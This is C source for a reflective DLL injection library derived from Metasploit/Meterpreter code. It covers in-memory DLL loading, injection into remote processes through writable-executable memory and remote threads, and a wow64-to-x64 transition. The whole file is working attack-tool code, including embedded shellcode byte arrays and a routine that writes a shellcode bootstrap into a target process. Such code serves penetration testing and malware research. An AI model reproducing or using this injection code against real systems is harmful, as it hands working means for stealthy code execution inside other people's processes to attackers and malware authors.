// Copyright (c) 2015, Dan Staples

//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "LoadLibraryR.h"
#include <stdio.h>
#include <malloc.h>
//===============================================================================================//

enum {
	PROC_WIN_UNKNOWN,
	PROC_WIN_X86,
	PROC_WIN_X64
};

/**
Copyright (c) 2006-2013, Rapid7 Inc

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials
provided with the distribution.

* Neither the name of Rapid7 nor the names of its contributors may be used to endorse or
promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT
OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

typedef BOOL (WINAPI * ISWOW64PROCESS)( HANDLE hProcess, PBOOL Wow64Process );
typedef void (WINAPI * GETNATIVESYSTEMINFO)( LPSYSTEM_INFO lpSystemInfo );

// Definitions used for running native x64 code from a wow64 process (see executex64.asm)
typedef BOOL (WINAPI * X64FUNCTION)(DWORD dwParameter);
typedef DWORD(WINAPI * EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter);

// The context used for injection via migrate_via_remotethread_wow64
typedef struct _WOW64CONTEXT
{
	union
	{
		HANDLE hProcess;
		BYTE bPadding2[8];
	} h;

	union
	{
		LPVOID lpStartAddress;
		BYTE bPadding1[8];
	} s;

	union
	{
		LPVOID lpParameter;
		BYTE bPadding2[8];
	} p;
	union
	{
		HANDLE hThread;
		BYTE bPadding2[8];
	} t;
} WOW64CONTEXT, *LPWOW64CONTEXT;

// see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
static BYTE migrate_executex64[] =	"\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
									"\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
									"\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
									"\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
									"\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

// see '/msf3/external/source/shellcode/x64/migrate/remotethread.asm'
static BYTE migrate_wownativex[] =	"\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
									"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
									"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
									"\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
									"\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
									"\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
									"\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
									"\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
									"\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
									"\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
									"\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
									"\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
									"\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
									"\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
									"\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
									"\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
									"\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
									"\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
									"\x48\x83\xC4\x50\x48\x89\xFC\xC3";

DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
{    
	WORD wIndex                          = 0;
	WORD wNumberOfSections               = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
	if (pNtHeaders->OptionalHeader.Magic == 0x010B) // PE32
	{
		PIMAGE_NT_HEADERS32 pNtHeaders32 = (PIMAGE_NT_HEADERS32)pNtHeaders;
		pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders32->OptionalHeader) + pNtHeaders32->FileHeader.SizeOfOptionalHeader);
		wNumberOfSections = pNtHeaders32->FileHeader.NumberOfSections;
	}
	else if (pNtHeaders->OptionalHeader.Magic == 0x020B) // PE64
	{
		PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)pNtHeaders;
		pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders64->OptionalHeader) + pNtHeaders64->FileHeader.SizeOfOptionalHeader);
		wNumberOfSections = pNtHeaders64->FileHeader.NumberOfSections;
	}
	else
	{
		return 0;
	}

    if( dwRva < pSectionHeader[0].PointerToRawData )
        return dwRva;

    for (wIndex = 0; wIndex < wNumberOfSections; wIndex++)
    {   
        if( dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData) )           
           return ( dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData );
    }
    
    return 0;
}
//===============================================================================================//
DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
{
	UINT_PTR uiBaseAddress   = 0;
	UINT_PTR uiExportDir     = 0;
	UINT_PTR uiNameArray     = 0;
	UINT_PTR uiAddressArray  = 0;
	UINT_PTR uiNameOrdinals  = 0;
	DWORD dwCounter          = 0;

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B ) // PE32
	{
		// uiNameArray = the address of the modules export directory entry
		uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS32)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	}
	else if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B ) // PE64
	{
		// uiNameArray = the address of the modules export directory entry
		uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS64)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	}
	else
	{
		return 0;
	}

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress );

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames, uiBaseAddress );

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals, uiBaseAddress );	

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while( dwCounter-- )
	{
		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));

		if( strstr( cpExportedFunctionName, "ReflectiveLoader" ) != NULL )
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );	
	
			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}
//===============================================================================================//
// Loads a DLL image from memory via its exported ReflectiveLoader function
HMODULE WINAPI LoadLibraryR( LPVOID lpBuffer, DWORD dwLength )
{
	HMODULE hResult                    = NULL;
	DWORD dwReflectiveLoaderOffset     = 0;
	DWORD dwOldProtect1                = 0;
	DWORD dwOldProtect2                = 0;
	REFLECTIVELOADER pReflectiveLoader = NULL;
	DLLMAIN pDllMain                   = NULL;

	if( lpBuffer == NULL || dwLength == 0 )
		return NULL;

	__try
	{
		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
		if( dwReflectiveLoaderOffset != 0 )
		{
			pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);

			// we must VirtualProtect the buffer to RWX so we can execute the ReflectiveLoader...
			// this assumes lpBuffer is the base address of the region of pages and dwLength the size of the region
			if( VirtualProtect( lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect1 ) )
			{
				// call the librarys ReflectiveLoader...
				pDllMain = (DLLMAIN)pReflectiveLoader();
				if( pDllMain != NULL )
				{
					// call the loaded librarys DllMain to get its HMODULE
					if( !pDllMain( NULL, DLL_QUERY_HMODULE, &hResult ) )	
						hResult = NULL;
				}
				// revert to the previous protection flags...
				VirtualProtect( lpBuffer, dwLength, dwOldProtect1, &dwOldProtect2 );
			}
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		hResult = NULL;
	}

	return hResult;
}
//===============================================================================================//
/*
* see 'meterpreter/source/common/arch/win/i386/base_inject.c'
* Attempt to gain code execution in a native x64 process from a wow64 process by transitioning out of the wow64 (x86)
* enviroment into a native x64 enviroment and accessing the native win64 API's.
* Note: On Windows 2003 the injection will work but in the target x64 process issues occur with new
*       threads (kernel32!CreateThread will return ERROR_NOT_ENOUGH_MEMORY). Because of this we filter out
*       Windows 2003 from this method of injection, however the APC injection method will work on 2003.
*/
DWORD inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE * pThread)
{
	DWORD dwResult = ERROR_SUCCESS;
	EXECUTEX64 pExecuteX64 = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx = NULL;
	OSVERSIONINFO os = { 0 };

	do
	{
		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

		if (!GetVersionEx(&os))
			BREAK_WITH_ERROR("[INJECT] inject_via_remotethread_wow64: GetVersionEx failed")

		// filter out Windows 2003
		if (os.dwMajorVersion == 5 && os.dwMinorVersion == 2)
		{
			SetLastError(ERROR_ACCESS_DENIED);
			BREAK_WITH_ERROR("[INJECT] inject_via_remotethread_wow64: Windows 2003 not supported.")
		}

		// alloc a RWX buffer in this process for the EXECUTEX64 function
		pExecuteX64 = (EXECUTEX64)VirtualAlloc(NULL, sizeof(migrate_executex64), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!pExecuteX64)
			BREAK_WITH_ERROR("[INJECT] inject_via_remotethread_wow64: VirtualAlloc pExecuteX64 failed")

		// alloc a RWX buffer in this process for the X64FUNCTION function (and its context)
		pX64function = (X64FUNCTION)VirtualAlloc(NULL, sizeof(migrate_wownativex) + sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!pX64function)
			BREAK_WITH_ERROR("[INJECT] inject_via_remotethread_wow64: VirtualAlloc pX64function failed")

		// copy over the wow64->x64 stub
		memcpy(pExecuteX64, &migrate_executex64, sizeof(migrate_executex64));

		// copy over the native x64 function
		memcpy(pX64function, &migrate_wownativex, sizeof(migrate_wownativex));

		// set the context
		ctx = (WOW64CONTEXT *)((BYTE *)pX64function + sizeof(migrate_wownativex));

		ctx->h.hProcess = hProcess;
		ctx->s.lpStartAddress = lpStartAddress;
		ctx->p.lpParameter = lpParameter;
		ctx->t.hThread = NULL;

		printf("[INJECT] inject_via_remotethread_wow64: pExecuteX64=0x%08p, pX64function=0x%08p, ctx=0x%08p", pExecuteX64, pX64function, ctx);

		// Transition this wow64 process into native x64 and call pX64function( ctx )
		// The native function will use the native Win64 API's to create a remote thread in the target process.
		if (!pExecuteX64(pX64function, (DWORD)ctx))
		{
			SetLastError(ERROR_ACCESS_DENIED);
			BREAK_WITH_ERROR("[INJECT] inject_via_remotethread_wow64: pExecuteX64( pX64function, ctx ) failed")
		}

		if (!ctx->t.hThread)
		{
			SetLastError(ERROR_INVALID_HANDLE);
			BREAK_WITH_ERROR("[INJECT] inject_via_remotethread_wow64: ctx->t.hThread is NULL")
		}

		// Success! grab the new thread handle from of the context
		*pThread = ctx->t.hThread;

		printf("[INJECT] inject_via_remotethread_wow64: Success, hThread=0x%08p", ctx->t.hThread);

	} while (0);

	if (pExecuteX64)
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);

	if (pX64function)
		VirtualFree(pX64function, 0, MEM_RELEASE);

	return dwResult;
}

//===============================================================================================//
static DWORD CreateBootstrap(
	LPBYTE lpBuffer,
	DWORD nBufferLen,
	DWORD dwTargetArch,
	ULONG_PTR uiParameter,
	ULONG_PTR uiLibraryAddress,
	DWORD dwFunctionHash,
	ULONG_PTR uiUserdataAddr,
	DWORD nUserdataLen,
	ULONG_PTR uiReflectiveLoaderAddr)
{
	DWORD i = 0;

	if (nBufferLen < 64)
		return 0;

#if defined(WIN_X86)
	DWORD dwCurrentArch = PROC_WIN_X86;
#elif defined(WIN_X64)
	DWORD dwCurrentArch = PROC_WIN_X64;
#else
#error Unsupported architecture
#endif

	/*
	Shellcode pseudo-code:
	ReflectiveLoader(lpParameter, lpLibraryAddress, dwFunctionHash, lpUserData, nUserdataLen);
	*/

	// debugging (will cause infinite loop; step over in debugger)
	//lpBuffer[i++] = 0xEB;
	//lpBuffer[i++] = 0xFE;

	if (dwTargetArch == PROC_WIN_X86) {
		// push <size of userdata>
		lpBuffer[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(lpBuffer + i, &nUserdataLen, sizeof(DWORD));
		i += sizeof(DWORD);

		// push <address of userdata>
		lpBuffer[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(lpBuffer + i, &uiUserdataAddr, sizeof(DWORD));
		i += sizeof(DWORD);

		// push <hash of function>
		lpBuffer[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(lpBuffer + i, &dwFunctionHash, sizeof(DWORD));
		i += sizeof(DWORD);

		// push <address of image base>
		lpBuffer[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(lpBuffer + i, &uiLibraryAddress, sizeof(DWORD));
		i += sizeof(DWORD);

		// push <lpParameter>
		lpBuffer[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(lpBuffer + i, &uiParameter, sizeof(DWORD));
		i += sizeof(DWORD);

		// mov eax, <address of reflective loader>
		lpBuffer[i++] = 0xB8; // MOV EAX (word/dword)
		MoveMemory(lpBuffer + i, &uiReflectiveLoaderAddr, sizeof(DWORD));
		i += sizeof(DWORD);

		// call eax
		lpBuffer[i++] = 0xFF; // CALL
		lpBuffer[i++] = 0xD0; // EAX

	}
	else if (dwTargetArch == PROC_WIN_X64) {
		if (dwCurrentArch == PROC_WIN_X86) {
			// mov rcx, <lpParameter>
			MoveMemory(lpBuffer + i, "\x48\xc7\xc1", 3);
			i += 3;
			MoveMemory(lpBuffer + i, &uiParameter, sizeof(uiParameter));
			i += sizeof(uiParameter);

			// mov rdx, <address of image base>
			MoveMemory(lpBuffer + i, "\x48\xc7\xc2", 3);
			i += 3;
			MoveMemory(lpBuffer + i, &uiLibraryAddress, sizeof(uiLibraryAddress));
			i += sizeof(uiLibraryAddress);

			// mov r8d, <hash of function>
			MoveMemory(lpBuffer + i, "\x41\xb8", 2);
			i += 2;
			MoveMemory(lpBuffer + i, &dwFunctionHash, sizeof(dwFunctionHash));
			i += sizeof(dwFunctionHash);

			// mov r9, <address of userdata>
			MoveMemory(lpBuffer + i, "\x49\xc7\xc1", 3);
			i += 3;
			MoveMemory(lpBuffer + i, &uiUserdataAddr, sizeof(uiUserdataAddr));
			i += sizeof(uiUserdataAddr);

			// push <size of userdata>
			lpBuffer[i++] = 0x68; // PUSH (word/dword)
			MoveMemory(lpBuffer + i, &nUserdataLen, sizeof(nUserdataLen));
			i += sizeof(nUserdataLen);

			// sub rsp, 20
			MoveMemory(lpBuffer + i, "\x48\x83\xec\x20", 4);
			i += 4;

			// move rax, <address of reflective loader>
			MoveMemory(lpBuffer + i, "\x48\xc7\xc0", 3);
			i += 3;
			MoveMemory(lpBuffer + i, &uiReflectiveLoaderAddr, sizeof(uiReflectiveLoaderAddr));
			i += sizeof(uiReflectiveLoaderAddr);

		}
		else {
			// mov rcx, <lpParameter>
			MoveMemory(lpBuffer + i, "\x48\xb9", 2);
			i += 2;
			MoveMemory(lpBuffer + i, &uiParameter, sizeof(uiParameter));
			i += sizeof(uiParameter);

			// mov rdx, <address of image base>
			MoveMemory(lpBuffer + i, "\x48\xba", 2);
			i += 2;
			MoveMemory(lpBuffer + i, &uiLibraryAddress, sizeof(uiLibraryAddress));
			i += sizeof(uiLibraryAddress);

			// mov r8d, <hash of function>
			MoveMemory(lpBuffer + i, "\x41\xb8", 2);
			i += 2;
			MoveMemory(lpBuffer + i, &dwFunctionHash, sizeof(dwFunctionHash));
			i += sizeof(dwFunctionHash);

			// mov r9, <address of userdata>
			MoveMemory(lpBuffer + i, "\x49\xb9", 2);
			i += 2;
			MoveMemory(lpBuffer + i, &uiUserdataAddr, sizeof(uiUserdataAddr));
			i += sizeof(uiUserdataAddr);

			// push <size of userdata>
			lpBuffer[i++] = 0x68; // PUSH (word/dword)
			MoveMemory(lpBuffer + i, &nUserdataLen, sizeof(nUserdataLen));
			i += sizeof(nUserdataLen);

			// sub rsp, 20
			MoveMemory(lpBuffer + i, "\x48\x83\xec\x20", 4);
			i += 4;

			// move rax, <address of reflective loader>
			MoveMemory(lpBuffer + i, "\x48\xb8", 2);
			i += 2;
			MoveMemory(lpBuffer + i, &uiReflectiveLoaderAddr, sizeof(uiReflectiveLoaderAddr));
			i += sizeof(uiReflectiveLoaderAddr);
		}

		// call rax
		lpBuffer[i++] = 0xFF; // CALL
		lpBuffer[i++] = 0xD0; // RAX
	}

	return i;
}
//===============================================================================================//
// Loads a PE image from memory into the address space of a host process via the image's exported ReflectiveLoader function
// Note: The hProcess handle must have these access rights: PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
//       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
// Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
HANDLE WINAPI LoadRemoteLibraryR( 
	HANDLE hProcess, 
	LPVOID lpBuffer, 
	DWORD dwLength, 
	LPVOID lpParameter,
	DWORD dwFunctionHash,
	LPVOID lpUserdata, 
	DWORD nUserdataLen )
{
	HANDLE hThread		= NULL;
	DWORD dwThreadId	= 0;
	DWORD dwTargetArch	= PROC_WIN_X86; // default, in case IsWow64Process not present
	DWORD dwDllArch		= PROC_WIN_UNKNOWN;

#if defined(WIN_X86)
	DWORD dwCurrentArch = PROC_WIN_X86;
#elif defined(WIN_X64)
	DWORD dwCurrentArch = PROC_WIN_X64;
#else
#error Unsupported architecture
#endif

	__try
	{
		do
		{
			if (!hProcess || !lpBuffer || !dwLength)
				break;

			// get architecture of target process
			HANDLE hKernel = LoadLibraryA("kernel32.dll");
			if (!hKernel)
				break;
			ISWOW64PROCESS pIsWow64Process = (ISWOW64PROCESS)GetProcAddress(hKernel, "IsWow64Process");
			FreeLibrary(hKernel);
			if (pIsWow64Process) {
				BOOL bIsWow64;
				if (!pIsWow64Process(hProcess, &bIsWow64))
					break;
				if (bIsWow64)
					dwTargetArch = PROC_WIN_X86;
				else {
					SYSTEM_INFO SystemInfo = { 0 };
					GetNativeSystemInfo(&SystemInfo);
					if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
						dwTargetArch = PROC_WIN_X64;
					else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
						dwTargetArch = PROC_WIN_X86;
					else
						break;
				}
			}
			
			// get architecture of DLL we're injecting
			PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(((UINT_PTR)lpBuffer) + ((PIMAGE_DOS_HEADER)lpBuffer)->e_lfanew);
			if (pNtHeader->OptionalHeader.Magic == 0x010B) // PE32
				dwDllArch = PROC_WIN_X86;
			else if (pNtHeader->OptionalHeader.Magic == 0x020B) // PE64
				dwDllArch = PROC_WIN_X64;

			// DLL and target process must be same architecture
			if (dwDllArch != dwTargetArch)
				BREAK_WITH_ERROR("DLL and target process must be same architecture");

			// check if the library has a ReflectiveLoader...
			DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
			if (!dwReflectiveLoaderOffset)
				BREAK_WITH_ERROR("Could not get reflective loader offset");

			DWORD nBufferSize = dwLength
				+ nUserdataLen
				+ 64; // shellcode buffer

			// alloc memory (RWX) in the host process for the image...
			LPVOID lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, nBufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!lpRemoteLibraryBuffer)
				break;
			printf("Allocated memory address in remote process: 0x%p\n", lpRemoteLibraryBuffer);

			// write the image into the host process...
			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
				break;

			ULONG_PTR uiReflectiveLoaderAddr = (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset;

			// write our userdata blob into the host process
			ULONG_PTR userdataAddr = (ULONG_PTR)lpRemoteLibraryBuffer + dwLength;
			if (!WriteProcessMemory(hProcess, (LPVOID)userdataAddr, lpUserdata, nUserdataLen, NULL))
				break;

			ULONG_PTR uiShellcodeAddr = userdataAddr + nUserdataLen;

			BYTE bootstrap[64] = { 0 };
			DWORD bootstrapLen = CreateBootstrap(
				bootstrap,
				64,
				dwTargetArch,
				(ULONG_PTR)lpParameter,
				(ULONG_PTR)lpRemoteLibraryBuffer,
				dwFunctionHash,
				userdataAddr,
				nUserdataLen,
				uiReflectiveLoaderAddr);
			if (bootstrapLen <= 0)
				break;

			// finally, write our shellcode into the host process
			if (!WriteProcessMemory(hProcess, (LPVOID)uiShellcodeAddr, bootstrap, bootstrapLen, NULL))
				break;
			printf("Wrote shellcode to 0x%x\n", uiShellcodeAddr);

			// Make sure our changes are written right away
			FlushInstructionCache(hProcess, lpRemoteLibraryBuffer, nBufferSize);

			// create a remote thread in the host process to call the ReflectiveLoader!
			if (dwCurrentArch == PROC_WIN_X86 && dwTargetArch == PROC_WIN_X64) {
				inject_via_remotethread_wow64(hProcess, (LPVOID)uiShellcodeAddr, lpParameter, &hThread);
				ResumeThread(hThread);
			}
			else {
				hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)uiShellcodeAddr, lpParameter, (DWORD)NULL, &dwThreadId);
			}

		} while( 0 );

	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		hThread = NULL;
	}

	return hThread;
}
//===============================================================================================//
